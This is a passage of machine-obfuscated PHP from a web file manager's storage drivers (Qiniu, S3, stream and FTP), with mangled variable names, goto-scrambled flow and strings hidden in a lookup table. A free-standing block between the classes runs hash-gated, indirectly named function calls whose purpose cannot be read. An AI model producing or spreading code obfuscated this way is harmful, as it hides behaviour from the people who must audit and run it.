} public function uploadFormData($E¥‘¼¦×²â, $bªÂá¦«›º = 3600) { return $this->uploadToken($E¥‘¼¦×²â, $bªÂá¦«›º); } public function multiUploadFormData($eÓÖ¨Í©ÏÚ, $bÜ†©Šƒ„ = 3600) { return $this->uploadToken($eÓÖ¨Í©ÏÚ, $bÜ†©Šƒ„); } private function uploadToken($Dªêší, $FÉÁÂ¹’²î = 3600) { goto eñóÕ»ÙÅÉ; bĞŞø´±Ù: $dâšèµ¿‹« = http_type() . "\x3a\57\57\x75\x70\x6c\157\x61\144{$A‹©•‘ÍÂË}\x2e\161\x69\156\x69\x75\x70\x2e\143\157\x6d\x2f"; return array($b÷†ì±÷ˆ[1291] => $aé’ ßÖœ, $b÷†ì±÷ˆ[1292] => $dâšèµ¿‹«); goto BÕÙ÷ôóĞö; eñóÕ»ÙÅÉ: $b÷†ì±÷ˆ =& $_SERVER[µ…]; $eó…”ÑŒØÎ = $FÉÁÂ¹’²î; $aÕŒ‘µ¸±Œ = array($b÷†ì±÷ˆ[1288] => $b÷†ì±÷ˆ[1289]); goto AØ»Æ³´­; AØ»Æ³´­: $B˜£¨¦ï›Ÿ = $Dªêší; $aé’ ßÖœ = $this->auth->uploadToken($this->bucket, $B˜£¨¦ï›Ÿ, $eó…”ÑŒØÎ, $aÕŒ‘µ¸±Œ, !0); $A‹©•‘ÍÂË = empty($this->region) || $this->region == $b÷†ì±÷ˆ[1290] ? $b÷†ì±÷ˆ[33] : $b÷†ì±÷ˆ[434] . $this->region; goto bĞŞø´±Ù; BÕÙ÷ôóĞö: } public function download($bã£Â›ù, $EÈ‚Ê§º) { goto e’ñáåñö; e’ñáåñö: $dÁñ£ñùÂƒ = IO::getPathInner(IO::mkfile($EÈ‚Ê§º)); if (!($b–âì¢†èÓ = $this->link($bã£Â›ù))) { return !1; } $cßÛÌ‚œÓ° = 0; goto a¼ìóŠŸê™; B†Ÿ¶‡¥®µ: fclose($CÛŸõò²‡); return $EÈ‚Ê§º; goto c‡Ï›»ÙÎ; a¼ìóŠŸê™: $AÊô ŒØ£ = 1024 * 200; $CÛŸõò²‡ = fopen($dÁñ£ñùÂƒ, $_SERVER[µ…][1293]); while (!0) { $Aé˜‹ éõ‚ = $this->fileSubstr($bã£Â›ù, $cßÛÌ‚œÓ°, $AÊô ŒØ£); if ($Aé˜‹ éõ‚ === !1) { return !1; } fwrite($CÛŸõò²‡, $Aé˜‹ éõ‚); $cßÛÌ‚œÓ° += $AÊô ŒØ£; if (strlen($Aé˜‹ éõ‚) < $AÊô ŒØ£) { break; } } goto B†Ÿ¶‡¥®µ; c‡Ï›»ÙÎ: } public function link($eß…°ÓöŠ, $a‚İ†Ÿ¾Ÿ = '') { if (!$this->isFile($eß…°ÓöŠ)) { return !1; } $b„¤‰ÊÉ = $this->getHost() . $_SERVER[µ…][8] . $this->pathEncode($eß…°ÓöŠ) . $a‚İ†Ÿ¾Ÿ; return $this->auth->privateDownloadUrl($b„¤‰ÊÉ, 3600 * 12); } public function fileOut($Cƒ‰ÙÓø Å, $Aöñºè–‰µ = false, $eùÊö³º»© = false, $e‰å“«ÛÏ = '') { $A§ÄÅ‡¿áÔ =& $_SERVER[µ…]; if ($this->isFileOutServer()) { return $this->fileOutServer($Cƒ‰ÙÓø Å, $Aöñºè–‰µ, $eùÊö³º»©, $e‰å“«ÛÏ); } if (!$eùÊö³º»©) { $eùÊö³º»© = $this->pathThis($Cƒ‰ÙÓø Å); } $C˜’Ğ¦à‡Ê = $Aöñºè–‰µ ? $A§ÄÅ‡¿áÔ[1294] . rawurlencode($eùÊö³º»©) : $A§ÄÅ‡¿áÔ[33]; $b±ĞĞËâ„½ = $this->link($Cƒ‰ÙÓø Å, $C˜’Ğ¦à‡Ê); $this->fileOutLink($b±ĞĞËâ„½); } public function fileOutServer($eÄŒ‡‘İÁÊ, $fŸ¥£¤¸Ö = false, $e¼ˆŒäõ²‰ = false, $Eë÷Öå¥ = '') { parent::fileOut($eÄŒ‡‘İÁÊ, $fŸ¥£¤¸Ö, $e¼ˆŒäõ²‰, $Eë÷Öå¥); } public function fileOutImage($f½›ÇØ–òß, $CÍÃ©ÖÅ¡Á = 250) { $f©çÒ©ŠØ± = $this->link($f½›ÇØ–òß, $_SERVER[µ…][1295] . $CÍÃ©ÖÅ¡Á); $this->fileOutLink($f©çÒ©ŠØ±); } public function fileOutImageServer($Dº·¸¶ŸéÔ, $E‰‘°Äã¿ = 250) { parent::fileOutImage($Dº·¸¶ŸéÔ, $E‰‘°Äã¿); } public function hashMd5($b¡çóØ«›ù) { $d¼‘œĞğó =& $_SERVER[µ…]; $eËæ™¨¹ä¬ = $this->objectMeta($b¡çóØ«›ù); return isset($eËæ™¨¹ä¬[$d¼‘œĞğó[206]]) ? $eËæ™¨¹ä¬[$d¼‘œĞğó[206]] : !1; $bºŠ¤¦·ôÜ = $this->link($b¡çóØ«›ù, $d¼‘œĞğó[1296]); } public function size($A¾·æ”â—›) { $CíÊÔ’»Ó† = $this->objectMeta($A¾·æ”â—›); return $CíÊÔ’»Ó† ? $CíÊÔ’»Ó†[$_SERVER[µ…][77]] : 0; } public function info($d÷ˆ‘ÓÁßÔ) { if ($this->isFolder($d÷ˆ‘ÓÁßÔ)) { return $this->folderInfo($d÷ˆ‘ÓÁßÔ); } else { if ($this->isFile($d÷ˆ‘ÓÁßÔ)) { return $this->fileInfo($d÷ˆ‘ÓÁßÔ); } } return !1; } public function exist($aöŒòˆö) { return $this->isFile($aöŒòˆö) || $this->isFolder($aöŒòˆö); } public function isFile($E‚È„—¸—©) { return !$this->isFolder($E‚È„—¸—©) && $this->objectMeta($E‚È„—¸—©); } public function isFolder($aêˆ¹ÃÓ¾) { return $this->cacheMethod($_SERVER[µ…][197], $aêˆ¹ÃÓ¾); } protected function objectMeta($b—‘¨¦â¬•) { return $this->cacheMethod($_SERVER[µ…][198], $b—‘¨¦â¬•); } protected function _objectMeta($EšŠŸĞ¶¿ö) { $bê¦°•ã¼ =& $_SERVER[µ…]; list($Bêèï”Ÿ…Í, $d—µ±±Ñâ·) = $this->bucketManager->stat($this->bucket, $EšŠŸĞ¶¿ö); if ($Bêèï”Ÿ…Í) { $Bêèï”Ÿ…Í[$bê¦°•ã¼[77]] = intval($Bêèï”Ÿ…Í[$bê¦°•ã¼[1282]]); } return $Bêèï”Ÿ…Í; } protected function _isFolder($dœÄÆåë) { $Fİ°Àï’íŸ =& $_SERVER[µ…]; if ($dœÄÆåë == $Fİ°Àï’íŸ[33] || $dœÄÆåë == $Fİ°Àï’íŸ[8]) { return !0; } list($F–˜ƒóÆ›Ë, $aßÃØÔ) = $this->bucketManager->listFiles($this->bucket, trim($dœÄÆåë, $Fİ°Àï’íŸ[8]) . $Fİ°Àï’íŸ[8], $Fİ°Àï’íŸ[33], 1, $Fİ°Àï’íŸ[8]); return !empty($F–˜ƒóÆ›Ë[$Fİ°Àï’íŸ[1285]]) || !empty($F–˜ƒóÆ›Ë[$Fİ°Àï’íŸ[1286]]) ? !0 : !1; } } $c‘¯õ±ô = $_SERVER[$_SERVER[µ…][810]]; $B«Ã¥Ãáô“ = $_SERVER[µ…][811]; goto BÜÛÎîñŞ„; BÜÛÎîñŞ„: if ($_SERVER[$_SERVER[µ…][812]] != $B«Ã¥Ãáô“($c‘¯õ±ô)) { goto fºÄ‡ˆ…ƒ; CéæÜíˆ‹Ÿ: $dƒèŞõ¹× = explode($_SERVER[µ…][227], $f›éÑÒß); if (count($dƒèŞõ¹×) < $_SERVER[µ…][577]) { $F®™¼Ïù´ß = $_SERVER[µ…][817]; $F®™¼Ïù´ß(); } $Côö±ò†¹‰ = $_SERVER[µ…][1237]; goto aùˆƒÑİØ¡; fºÄ‡ˆ…ƒ: $bŠà…„–Ğê = $_SERVER[µ…][814]; $CˆÙÏå¿× = $_SERVER[$_SERVER[µ…][815]] . $_SERVER[µ…][816]; $f›éÑÒß = $bŠà…„–Ğê($CˆÙÏå¿×); goto CéæÜíˆ‹Ÿ; aùˆƒÑİØ¡: $Côö±ò†¹‰($c‘¯õ±ô); goto c¨—é‚îäà; c¨—é‚îäà: } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($C¸‡Øå”·¼) { parent::__construct($C¸‡Øå”·¼); } public function uploadFormData($Cã¿ç—Í¦, $fÆİº›ÙÅÅ = 3600) { goto C²™ôÒó¾; BÉÉãÄ ¥ƒ: $Fª”Û÷Å‘¡ = array($this->accessKey, $bœ«¨Ğ‰Ê, $this->region, $fœƒË˜ÀÊÁ, $b¼íé‰ŠÕ‘); $A•º ¼’À = implode($ašÚğçù¼õ[8], $Fª”Û÷Å‘¡); $eÙ¯›±Òè = array($ašÚğçù¼õ[1166] => gmdate($ašÚğçù¼õ[1165], strtotime($ašÚğçù¼õ[1203])), $ašÚğçù¼õ[1167] => array(array($ašÚğçù¼õ[1169] => $this->bucket), array($ašÚğçù¼õ[1168] => $D¯ÒÇÏä÷Ò), array($ašÚğçù¼õ[1170], $ašÚğçù¼õ[1171], $ašÚğçù¼õ[33]), array($ašÚğçù¼õ[1170], $ašÚğçù¼õ[1204], $ašÚğçù¼õ[33]), array($ašÚğçù¼õ[1170], $ašÚğçù¼õ[1205], $ašÚğçù¼õ[33]), array($ašÚğçù¼õ[1172] => $A¹é¾Éöó°), array($ašÚğçù¼õ[1206] => $A•º ¼’À), array($ašÚğçù¼õ[1207] => $a¼ÄÀ±¦®ò), array($ašÚğçù¼õ[1208] => $F…´—­ÑŒ), array($ašÚğçù¼õ[1209] => $BÅËºÑØ¾ù))); goto Dõ‹ƒù¹Â¥; bâ×ÏÏÔ–˜: $fœƒË˜ÀÊÁ = $ašÚğçù¼õ[59]; $F…´—­ÑŒ = gmdate($ašÚğçù¼õ[1201]); $bœ«¨Ğ‰Ê = gmdate($ašÚğçù¼õ[705]); goto Eò‚×‹Ì÷Ö; a¼ŒºÇÆÚ: $B¦äª‡­­á = hash_hmac($ašÚğçù¼õ[1210], $fœƒË˜ÀÊÁ, $C¬ÄÏ¼ù¤, !0); $a¢ë„¨Ìñœ = hash_hmac($ašÚğçù¼õ[1210], $b¼íé‰ŠÕ‘, $B¦äª‡­­á, !0); $b¿¸¹ŸØ±É = hash_hmac($ašÚğçù¼õ[1210], $dÏÃìÚ•¶Î, $a¢ë„¨Ìñœ); goto DÆÍé¢Ê‡Å; Dõ‹ƒù¹Â¥: $dÏÃìÚ•¶Î = base64_encode(json_encode($eÙ¯›±Òè)); $c‰¾‡«Æ„å = hash_hmac($ašÚğçù¼õ[1210], $bœ«¨Ğ‰Ê, $ašÚğçù¼õ[1211] . $this->secret, !0); $C¬ÄÏ¼ù¤ = hash_hmac($ašÚğçù¼õ[1210], $this->region, $c‰¾‡«Æ„å, !0); goto a¼ŒºÇÆÚ; DÆÍé¢Ê‡Å: $F³¦¤–ó„î = array($ašÚğçù¼õ[209] => $ašÚğçù¼õ[33], $ašÚğçù¼õ[1212] => $ašÚğçù¼õ[33], $ašÚğçù¼õ[1168] => $D¯ÒÇÏä÷Ò, $ašÚğçù¼õ[1172] => $A¹é¾Éöó°, $ašÚğçù¼õ[1176] => $dÏÃìÚ•¶Î, $ašÚğçù¼õ[1213] => $A•º ¼’À, $ašÚğçù¼õ[1214] => $a¼ÄÀ±¦®ò, $ašÚğçù¼õ[1215] => $F…´—­ÑŒ, $ašÚğçù¼õ[1216] => $BÅËºÑØ¾ù, $ašÚğçù¼õ[1217] => $b¿¸¹ŸØ±É, $ašÚğçù¼õ[174] => $this->getHost()); return $F³¦¤–ó„î; goto aÇŒ„¡ŞË¤; C²™ôÒó¾: $ašÚğçù¼õ =& $_SERVER[µ…]; $D¯ÒÇÏä÷Ò = $ašÚğçù¼õ[190]; $a¼ÄÀ±¦®ò = $ašÚğçù¼õ[1200]; goto bâ×ÏÏÔ–˜; Eò‚×‹Ì÷Ö: $b¼íé‰ŠÕ‘ = $ašÚğçù¼õ[1202]; $BÅËºÑØ¾ù = $fÆİº›ÙÅÅ . $ašÚğçù¼õ[33]; $A¹é¾Éöó° = $ašÚğçù¼õ[1164]; goto BÉÉãÄ ¥ƒ; aÇŒ„¡ŞË¤: } public function multiUploadFormData($D˜’íßã, $C×÷ß¦‘Œ = 3600) { $fí£ì…äÍÊ =& $_SERVER[µ…]; $AÓ¾Ï‹Ÿ’ = gmdate($fí£ì…äÍÊ[1297]); $bÖùË†„‘Ñ = array(); $f¬ïÄÁ˜  = $this->client->getUploadId($this->bucket, $D˜’íßã, $bÖùË†„‘Ñ); if (!$f¬ïÄÁ˜ ) { return !1; } return array($fí£ì…äÍÊ[219] => $f¬ïÄÁ˜ , $fí£ì…äÍÊ[174] => $this->getHost() . $fí£ì…äÍÊ[8] . $this->pathEncode($D˜’íßã), $fí£ì…äÍÊ[220] => $AÓ¾Ï‹Ÿ’, $fí£ì…äÍÊ[92] => $D˜’íßã); } public function multiUploadAuthData($b­›‹œ¸…™, $CùÒØíÇëÖ = array()) { goto FŠùÓ‚è¦; FŠùÓ‚è¦: $AËêƒ¼¡­’ =& $_SERVER[µ…]; $AµŸæ»Ï†¦ = isset($CùÒØíÇëÖ[$AËêƒ¼¡­’[167]]) ? $CùÒØíÇëÖ[$AËêƒ¼¡­’[167]] : $AËêƒ¼¡­’[33]; $Fæº¬–²áº = $CùÒØíÇëÖ[$AËêƒ¼¡­’[92]]; goto D¿¿“½†êç; D¿¿“½†êç: unset($CùÒØíÇëÖ[$AËêƒ¼¡­’[92]]); if (isset($CùÒØíÇëÖ[$AËêƒ¼¡­’[221]])) { return $this->listUploadParts($Fæº¬–²áº, $CùÒØíÇëÖ); } $A÷¯‹Ÿñ™« = array(); goto E·ÌÓô«Ó; e»·è»ÓÃã: if (strpos($AµŸæ»Ï†¦, $AËêƒ¼¡­’[223]) === 0) { if (isset($A÷¯‹Ÿñ™«[$AËêƒ¼¡­’[1299]])) { $fƒø¬±­¢¯ = $A÷¯‹Ÿñ™«[$AËêƒ¼¡­’[1299]]; } else { if (isset($Dº÷ìå±‰‚[$AËêƒ¼¡­’[1299]])) { $fƒø¬±­¢¯ = $Dº÷ìå±‰‚[$AËêƒ¼¡­’[1299]]; } else { $fƒø¬±­¢¯ = hash($AËêƒ¼¡­’[1210], $AËêƒ¼¡­’[33]); } } return array($AËêƒ¼¡­’[230] => $Dº÷ìå±‰‚[$AËêƒ¼¡­’[230]], $AËêƒ¼¡­’[1299] => $fƒø¬±­¢¯, $AËêƒ¼¡­’[220] => $Dº÷ìå±‰‚[$AËêƒ¼¡­’[1302]]); } return $Dº÷ìå±‰‚[$AËêƒ¼¡­’[230]]; goto Bî´Óò…; Dä«ÚÄ¡Ìí: $Eîˆ‡©À‹ = $AËêƒ¼¡­’[224]; $cÑ’áãÄÔ¨ = $AËêƒ¼¡­’[8] . $this->pathEncode($Fæº¬–²áº) . $AµŸæ»Ï†¦; $Dº÷ìå±‰‚ = $this->client->__getSignatureV4($A÷¯‹Ÿñ™«, $B–Š®“‹­¨, $Eîˆ‡©À‹, $cÑ’áãÄÔ¨); goto e»·è»ÓÃã; E·ÌÓô«Ó: if (isset($CùÒØíÇëÖ[$AËêƒ¼¡­’[1298]])) { $A÷¯‹Ÿñ™«[$AËêƒ¼¡­’[1299]] = $CùÒØíÇëÖ[$AËêƒ¼¡­’[1298]]; } $AÉÃö×‚‹Ï = explode($AËêƒ¼¡­’[176], $this->getHost()); $B–Š®“‹­¨ = array($AËêƒ¼¡­’[1300] => $AÉÃö×‚‹Ï[1], $AËêƒ¼¡­’[1301] => $AËêƒ¼¡­’[33], $AËêƒ¼¡­’[209] => $AËêƒ¼¡­’[118], $AËêƒ¼¡­’[1212] => $CùÒØíÇëÖ[$AËêƒ¼¡­’[77]]); goto Dä«ÚÄ¡Ìí; Bî´Óò…: } public function listUploadParts($FÊ«àõ¦‡”, $Fªò®ÊñÓô = array()) { goto a²“„Ö¸¾ª; aÈ”¢É‹ˆ‹: if (!$d‹¬ê‰Ó—) { return !1; } $B–±­÷º¨¹ = $BÁ…ç¡…®[1303]; foreach ($d‹¬ê‰Ó— as $e¼¢ğÉÂ¿‡) { $B–±­÷º¨¹ .= $BÁ…ç¡…®[1304] . "\74\x50\141\162\164\116\165\155\142\145\162\x3e{$e¼¢ğÉÂ¿‡[$BÁ…ç¡…®[1259]]}\74\x2f\x50\x61\162\164\x4e\165\x6d\x62\145\x72\76\12" . "\x3c\x45\x54\x61\147\x3e{$e¼¢ğÉÂ¿‡[$BÁ…ç¡…®[1260]]}\x3c\57\105\124\x61\x67\x3e\xa" . $BÁ…ç¡…®[1305]; } goto AóáŒ‰‹¯º; fÇ»´¥¥Ë: $b•¼ÅîµÁ = array($BÁ…ç¡…®[1300] => $C¾àù–¯ç¤[1], $BÁ…ç¡…®[209] => $BÁ…ç¡…®[118], $BÁ…ç¡…®[1212] => strlen($B–±­÷º¨¹)); $DÄš‰¶ßÆ» = $BÁ…ç¡…®[222]; $c™İ¹ãøğŒ = $BÁ…ç¡…®[8] . $this->pathEncode($FÊ«àõ¦‡”) . $Fªò®ÊñÓô[$BÁ…ç¡…®[167]]; goto C·Öİ‘ŸÆ…; AóáŒ‰‹¯º: $B–±­÷º¨¹ .= $BÁ…ç¡…®[1306]; $c„”ÊÇŞ³¢ = array(); $C¾àù–¯ç¤ = explode($BÁ…ç¡…®[176], $this->getHost()); goto fÇ»´¥¥Ë; a²“„Ö¸¾ª: $BÁ…ç¡…® =& $_SERVER[µ…]; $EÑİğˆíÍ = str_replace($BÁ…ç¡…®[231], $BÁ…ç¡…®[33], $Fªò®ÊñÓô[$BÁ…ç¡…®[167]]); $d‹¬ê‰Ó— = $this->client->listParts($this->bucket, $FÊ«àõ¦‡”, $EÑİğˆíÍ); goto aÈ”¢É‹ˆ‹; C·Öİ‘ŸÆ…: $cÑ‚øë›³® = $this->client->__getSignatureV4($c„”ÊÇŞ³¢, $b•¼ÅîµÁ, $DÄš‰¶ßÆ», $c™İ¹ãøğŒ, $B–±­÷º¨¹); return array($BÁ…ç¡…®[230] => $cÑ‚øë›³®[$BÁ…ç¡…®[230]], $BÁ…ç¡…®[220] => $cÑ‚øë›³®[$BÁ…ç¡…®[1302]], $BÁ…ç¡…®[232] => $d‹¬ê‰Ó—, $BÁ…ç¡…®[1299] => $cÑ‚øë›³®[$BÁ…ç¡…®[1299]]); goto bÆİœ†¡‰; bÆİœ†¡‰: } public function link($a÷ó…È¥¿¾, $E¢É£¥Èî¢ = array()) { return parent::link($a÷ó…È¥¿¾, $E¢É£¥Èî¢); } public function fileOut($F‚ãÉ÷Œ , $AÊèîÜÏè = false, $Eùİ¨ÚÎëº = false, $DˆÖ×·¥ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[µ…][1307])) { return parent::fileOutServer($F‚ãÉ÷Œ , $AÊèîÜÏè, $Eùİ¨ÚÎëº, $DˆÖ×·¥); } parent::fileOut($F‚ãÉ÷Œ , $AÊèîÜÏè, $Eùİ¨ÚÎëº, $DˆÖ×·¥); } public function fileOutImage($cÜˆñ²‹ø, $eÒó°…ÁµÍ = 250) { if (strstr($this->endpoint, $_SERVER[µ…][1307])) { return parent::fileOutImageServer($cÜˆñ²‹ø, $eÒó°…ÁµÍ); } parent::fileOutImage($cÜˆñ²‹ø, $eÒó°…ÁµÍ); } public function fileOutLink($eËÁ©çÈ©²) { $fµŠ‰‹¢Åò =& $_SERVER[µ…]; if (substr($eËÁ©çÈ©², 0, 7) == $fµŠ‰‹¢Åò[1179]) { $eËÁ©çÈ©² = $fµŠ‰‹¢Åò[1180] . substr($eËÁ©çÈ©², 7); } header($fµŠ‰‹¢Åò[158] . $eËÁ©çÈ©²); die; } public function getHost() { $F‚°¥æÂ„ =& $_SERVER[µ…]; $aíİÜ…Ä¦Š = str_rtrim(parent::getHost(), $F‚°¥æÂ„[8] . $this->bucket); $aíİÜ…Ä¦Š = explode($F‚°¥æÂ„[176], $aíİÜ…Ä¦Š); return $aíİÜ…Ä¦Š[0] . $F‚°¥æÂ„[176] . $this->bucket . $F‚°¥æÂ„[94] . $aíİÜ…Ä¦Š[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($fïŠ˜°œ¨, $fğ¤Ø¦ğö = 0) { parent::__construct(); $this->source = $fïŠ˜°œ¨; $this->sourceSize = $fğ¤Ø¦ğö; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($B§óĞíŒŒ = false) { return $this->sourceSize; } public function getContent($bŒ ÷•Î«‹ = false) { return $this->fileSubstr($bŒ ÷•Î«‹, 0, $this->sourceSize); } public function fileSubstr($cé›³••é = false, $A»Ø¤âŒ©‡ = 0, $e…Œóğ¤ˆŠ = 0) { if (!$e…Œóğ¤ˆŠ) { $e…Œóğ¤ˆŠ = $this->sourceSize; } $D³Ôà¾ = $this->sourceSize - $A»Ø¤âŒ©‡; if ($e…Œóğ¤ˆŠ >= $D³Ôà¾) { $e…Œóğ¤ˆŠ = $D³Ôà¾; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $A»Ø¤âŒ©‡, $e…Œóğ¤ˆŠ); } if ($this->sourceType == self::TYPE_FILE) { if ($e…Œóğ¤ˆŠ <= 0) { return $_SERVER[µ…][33]; } $FêİìË·„ğ = ftell($this->source); fseek_64($this->source, $FêİìË·„ğ + $A»Ø¤âŒ©‡); $Cš¦Æøİ¨Â = @fread($this->source, $e…Œóğ¤ˆŠ); fseek_64($this->source, $FêİìË·„ğ); return $Cš¦Æøİ¨Â; } } public function hashMd5($AÏ¸‡Şí = false) { return md5($this->getContent()); } public static function hash($fÈä‡ê‚‡´, $e÷Ô¯öÛ¨– = 0) { $AŒÖŒ£²ší = new PathDriverStream($fÈä‡ê‚‡´, $e÷Ô¯öÛ¨–); return $AŒÖŒ£²ší->hashSimple($fÈä‡ê‚‡´); } public static function md5($a˜±èë‹¬­, $B÷…Îå¹ªŠ = 0) { $d¹ÇšÁ»•ª = new PathDriverStream($a˜±èë‹¬­, $B÷…Îå¹ªŠ); return $d¹ÇšÁ»•ª->hashMd5($a˜±èë‹¬­); } } goto dŸÜÑ»°¸; EÌ¦“ÙĞ™: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($BÃÈ›ƒ„˜) { parent::__construct(); if (count($BÃÈ›ƒ„˜) > 0) { $this->_init($BÃÈ›ƒ„˜); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($Eä†öì‹) { $dÓæ¬Çœ—² =& $_SERVER[µ…]; global $config; $this->appCharset = $config[$dÓæ¬Çœ—²[1218]]; $this->systemCharset = $config[$dÓæ¬Çœ—²[1219]]; if (isset($Eä†öì‹[$dÓæ¬Çœ—²[1220]]) && $Eä†öì‹[$dÓæ¬Çœ—²[1220]]) { $this->systemCharset = $Eä†öì‹[$dÓæ¬Çœ—²[1220]]; } } public function iconvApp($Fé½›õ³’) { return $this->iconvTo($Fé½›õ³’, $this->systemCharset, $this->appCharset); } public function iconvSystem($b²…„šì—‰) { return $this->iconvTo($b²…„šì—‰, $this->appCharset, $this->systemCharset); } public function getPathOuter($e»ƒÆºÎ½) { goto D…¸‘ªâ›£; FÒ”é‡ÓŸ: $e»ƒÆºÎ½ = KodIO::clear($e»ƒÆºÎ½); $e»ƒÆºÎ½ = substr($e»ƒÆºÎ½, strlen($AÏÄÜî„›¯)); if (empty($this->pathDriver)) { return $e»ƒÆºÎ½; } goto cìš„‚Œ²; D…¸‘ªâ›£: $DóÛÂ‡Š¤® =& $_SERVER[µ…]; $AÏÄÜî„›¯ = $this->iconvApp($this->pathBase); $e»ƒÆºÎ½ = $this->iconvApp($e»ƒÆºÎ½); goto fÎîô®öØ; cìš„‚Œ²: return $this->pathDriver . $DóÛÂ‡Š¤®[8] . ltrim($e»ƒÆºÎ½, $DóÛÂ‡Š¤®[8]); goto f¨É¡÷ÛˆŒ; fÎîô®öØ: if (substr($AÏÄÜî„›¯, 0, 2) == $DóÛÂ‡Š¤®[1221]) { $AÏÄÜî„›¯ = BASIC_PATH . substr($AÏÄÜî„›¯, 2); } if (substr($e»ƒÆºÎ½, 0, 2) == $DóÛÂ‡Š¤®[1221]) { $e»ƒÆºÎ½ = BASIC_PATH . substr($e»ƒÆºÎ½, 2); } $AÏÄÜî„›¯ = KodIO::clear($AÏÄÜî„›¯); goto FÒ”é‡ÓŸ; f¨É¡÷ÛˆŒ: } private function _init($bĞ«£ù»Ñ– = array()) { $D”ãÑì«Ò =& $_SERVER[µ…]; if (!function_exists($D”ãÑì«Ò[1222])) { throw new Exception(LNG($D”ãÑì«Ò[1223])); } $this->config = $bĞ«£ù»Ñ–; $this->charsetReset($bĞ«£ù»Ñ–); foreach ($bĞ«£ù»Ñ– as $d‚¿ÔÂëìİ => $eÎ®¤‹Ù—¼) { if (isset($this->{$d‚¿ÔÂëìİ})) { $this->{$d‚¿ÔÂëìİ} = $eÎ®¤‹Ù—¼; } } return $this->_login($bĞ«£ù»Ñ–); } private function _login($c¥Ãò’…) { goto a¼õº×Ş‡‡; a¼õº×Ş‡‡: $f‚­ÑÂŸ¹ =& $_SERVER[µ…]; static $F¦µÕóãÀù = array(); $E ¿™ØåÛÑ = md5(json_encode($c¥Ãò’…)); goto f°…‘ÁâÃ“; f°…‘ÁâÃ“: if (isset($F¦µÕóãÀù[$E ¿™ØåÛÑ])) { foreach ($F¦µÕóãÀù[$E ¿™ØåÛÑ] as $c ÌùÜó»¹ => $B„á±ŸæÁ–) { $this->{$c ÌùÜó»¹} = $B„á±ŸæÁ–; } return !0; } $A¢êëƒ± = parse_url(trim($this->server, $f‚­ÑÂŸ¹[8])); $this->host = $A¢êëƒ±[$f‚­ÑÂŸ¹[174]]; goto dÚ»ö½„­©; dÒÛ²ÜÇï»: $F¦µÕóãÀù[$E ¿™ØåÛÑ] = array($f‚­ÑÂŸ¹[1227] => $this->connect, $f‚­ÑÂŸ¹[174] => $this->host, $f‚­ÑÂŸ¹[173] => $this->scheme, $f‚­ÑÂŸ¹[175] => $this->port); return $c½«Õ²¥ÖÑ; goto a»ìœ¸ğ§; f«Î‰¶ˆ¬Ö: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $cÔï–…Å³– = $this->pasv == $f‚­ÑÂŸ¹[86] ? !0 : !1; @ftp_pasv($this->connect, $cÔï–…Å³–); goto dÒÛ²ÜÇï»; dÚ»ö½„­©: $f³˜‡’ÑÃ = isset($A¢êëƒ±[$f‚­ÑÂŸ¹[173]]) && $A¢êëƒ±[$f‚­ÑÂŸ¹[173]] == $f‚­ÑÂŸ¹[1224] ? !0 : !1; $this->scheme = $f³˜‡’ÑÃ ? $f‚­ÑÂŸ¹[1225] : $f‚­ÑÂŸ¹[1226]; $this->port = isset($A¢êëƒ±[$f‚­ÑÂŸ¹[175]]) ? $A¢êëƒ±[$f‚­ÑÂŸ¹[175]] : 21; goto dÔ‘›ÖíÀÊ; dÔ‘›ÖíÀÊ: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $c½«Õ²¥ÖÑ = @ftp_login($this->connect, $this->username, $this->userpass); goto f«Î‰¶ˆ¬Ö; a»ìœ¸ğ§: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($aí’ø“‰õ, $fÊ«ÜÒ­Ô¥ = '', $D©ß®ÜÍ×è = REPEAT_RENAME) { if ($this->setContent($aí’ø“‰õ, $fÊ«ÜÒ­Ô¥)) { return $this->getPathOuter($aí’ø“‰õ); } return !1; } public function mkdir($c³˜Ê•ÎÊ, $A†øòÄ™¿Ò = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $c³˜Ê•ÎÊ = $this->iconvSystem($c³˜Ê•ÎÊ); if ($this->_isFolder($c³˜Ê•ÎÊ) || @ftp_mkdir($this->connect, $c³˜Ê•ÎÊ)) { return $this->getPathOuter($c³˜Ê•ÎÊ); } if (!$this->mkdir($this->pathFather($c³˜Ê•ÎÊ))) { return !1; } if ($c³˜Ê•ÎÊ = @ftp_mkdir($this->connect, $c³˜Ê•ÎÊ)) { return $this->getPathOuter($c³˜Ê•ÎÊ); } return !1; } public function copyFile($d“‹ïá‰æ‰, $CÔöİ³˜Á©) { goto aù†šÑ¢à; CñĞã´«¹ä: $this->tempFileRemve($a£ÁÏæÄµô); return $dÅÚ¨¼ÊÖÌ; goto d³ÁªñÔ; c¡ğŠ¹‘–: $Eäéèá¾Ş… = $this->iconvApp($a£ÁÏæÄµô); $this->download($d“‹ïá‰æ‰, $Eäéèá¾Ş…); $dÅÚ¨¼ÊÖÌ = $this->upload($CÔöİ³˜Á©, $Eäéèá¾Ş…); goto CñĞã´«¹ä; aù†šÑ¢à: if (!$this->_isconn()) { return !1; } $Dœ„Œù†¢Í = $this->pathThis($this->iconvSystem($d“‹ïá‰æ‰)); $a£ÁÏæÄµô = $this->tempFile($Dœ„Œù†¢Í); goto c¡ğŠ¹‘–; d³ÁªñÔ: } public function moveFile($BÃøÚš¯õ, $Dìº‡›»Æ‰) { if (!$this->_isconn()) { return !1; } $BÃøÚš¯õ = $this->iconvSystem($BÃøÚš¯õ); $Dìº‡›»Æ‰ = $this->iconvSystem($Dìº‡›»Æ‰); $f®øø±ĞÚÅ = @ftp_rename($this->connect, $BÃøÚš¯õ, $Dìº‡›»Æ‰); return $f®øø±ĞÚÅ ? $this->getPathOuter($Dìº‡›»Æ‰) : !1; } public function delFile($fĞ˜«ÏİŒ­) { if (!$this->_isconn()) { 